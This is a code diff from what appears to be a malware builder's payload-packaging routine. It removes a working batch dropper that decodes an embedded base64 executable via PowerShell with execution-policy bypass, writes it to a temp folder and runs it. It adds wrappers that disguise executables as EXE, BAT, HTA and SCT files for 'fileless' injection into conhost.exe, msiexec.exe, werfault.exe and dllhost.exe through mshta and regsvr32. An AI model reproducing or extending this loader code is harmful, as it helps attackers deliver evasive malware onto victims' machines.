@@ -913,41 +913,31 @@ func runBoundFiles() {
           }
         }
 
-        if (isBatWrapper) {
-          sendToStream({ type: "output", text: `Wrapping PE binary as ${winExt} script...\n`, level: "info" });
+        // ── EXE wrapper: Go LOLBAS loader, fileless PE injection ──────────────
+        const isExeWrapper = os === "windows" && winExt === ".exe";
+        if (isExeWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as fileless EXE loader (LOTL: conhost.exe)...\n`, level: "info" });
           try {
+            const { wrapPeAsLoaderExe } = await import("./exe-wrapper");
             const exeBytes = fs.readFileSync(filePath);
-            const b64 = exeBytes.toString("base64");
-            // Split into 76-char lines so the bat file stays manageable
-            const b64Lines = b64.match(/.{1,76}/g) || [b64];
-            // Random marker generated at build time using the same uuid util already imported
-            const marker = `:OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
-            // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
-            // decodes base64 to a temp .exe, launches it, then exits.
-            const psCmd = [
-              `$f=$env:_OVD_SELF;`,
-              `$l=[IO.File]::ReadAllLines($f);`,
-              `$i=0;`,
-              `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
-              `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
-              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
-              `[IO.File]::WriteAllBytes($t,$b);`,
-              `Start-Process $t;`,
-              `exit`,
-            ].join("");
-            const wrapper = [
-              `@echo off`,
-              `setlocal`,
-              `set "_OVD_SELF=%~f0"`,
-              `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
-              `endlocal`,
-              `exit /b 0`,
-              marker,
-              ...b64Lines,
-            ].join("\r\n") + "\r\n";
-            fs.writeFileSync(filePath, wrapper, "utf8");
+            await wrapPeAsLoaderExe(exeBytes, filePath, actualArch, outDir);
             finalSize = fs.statSync(filePath).size;
-            sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} script\n`, level: "info" });
+            sendToStream({ type: "output", text: `EXE loader: ${exeBytes.length} byte PE → ${finalSize} byte loader (fileless injection into conhost.exe)\n`, level: "info" });
+          } catch (exeErr: any) {
+            sendToStream({ type: "output", text: `WARNING: EXE loader wrapper failed: ${exeErr.message || exeErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End EXE wrapper ──────────────────────────────────────────────────
+
+        if (isBatWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as fileless ${winExt} (LOTL: msiexec.exe)...\n`, level: "info" });
+          try {
+            const { wrapPeAsBat } = await import("./bat-wrapper");
+            const exeBytes = fs.readFileSync(filePath);
+            const batContent = wrapPeAsBat(exeBytes);
+            fs.writeFileSync(filePath, batContent, "utf8");
+            finalSize = fs.statSync(filePath).size;
+            sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} (fileless injection into msiexec.exe)\n`, level: "info" });
           } catch (wrapErr: any) {
             sendToStream({ type: "output", text: `WARNING: Failed to generate bat wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
           }
@@ -1007,6 +997,62 @@ func runBoundFiles() {
           }
         }
         // ── End Tasks.json wrapper ────────────────────────────────────────────
+
+        // ── HTA wrapper: mshta.exe LOLBAS delivery, fileless PE injection ────
+        const isHtaWrapper = os === "windows" && winExt === ".hta";
+        if (isHtaWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as fileless HTA (LOTL: werfault.exe)...\n`, level: "info" });
+          try {
+            const { wrapPeAsHta } = await import("./hta-wrapper");
+            const exeBytes = fs.readFileSync(filePath);
+            const htaContent = wrapPeAsHta(exeBytes);
+            const htaPath = filePath.replace(/\.[^.]+$/, ".hta");
+            fs.writeFileSync(htaPath, htaContent, "utf8");
+            if (htaPath !== filePath) fs.unlinkSync(filePath);
+            finalSize = fs.statSync(htaPath).size;
+            const htaOutputName = outputName.replace(/\.[^.]+$/, ".hta");
+            sendToStream({ type: "output", text: `HTA wrapped: ${exeBytes.length} byte PE → ${finalSize} byte HTA (fileless injection into werfault.exe)\n`, level: "info" });
+            (build.files as any[]).push({
+              name: htaOutputName,
+              filename: htaOutputName,
+              platform,
+              version: agentVersion,
+              size: finalSize,
+            });
+            continue;
+          } catch (htaErr: any) {
+            sendToStream({ type: "output", text: `WARNING: HTA wrapper failed: ${htaErr.message || htaErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End HTA wrapper ──────────────────────────────────────────────────
+
+        // ── SCT wrapper: regsvr32.exe LOLBAS delivery, fileless PE injection ─
+        const isSctWrapper = os === "windows" && winExt === ".sct";
+        if (isSctWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as fileless SCT (LOTL: dllhost.exe)...\n`, level: "info" });
+          try {
+            const { wrapPeAsSct } = await import("./sct-wrapper");
+            const exeBytes = fs.readFileSync(filePath);
+            const sctContent = wrapPeAsSct(exeBytes);
+            const sctPath = filePath.replace(/\.[^.]+$/, ".sct");
+            fs.writeFileSync(sctPath, sctContent, "utf8");
+            if (sctPath !== filePath) fs.unlinkSync(filePath);
+            finalSize = fs.statSync(sctPath).size;
+            const sctOutputName = outputName.replace(/\.[^.]+$/, ".sct");
+            sendToStream({ type: "output", text: `SCT wrapped: ${exeBytes.length} byte PE → ${finalSize} byte SCT (fileless injection into dllhost.exe)\n`, level: "info" });
+            (build.files as any[]).push({
+              name: sctOutputName,
+              filename: sctOutputName,
+              platform,
+              version: agentVersion,
+              size: finalSize,
+            });
+            continue;
+          } catch (sctErr: any) {
+            sendToStream({ type: "output", text: `WARNING: SCT wrapper failed: ${sctErr.message || sctErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End SCT wrapper ──────────────────────────────────────────────────
 
         // ── IPA packaging for iOS targets ──────────────────────────────────────
         if (os === "ios") {
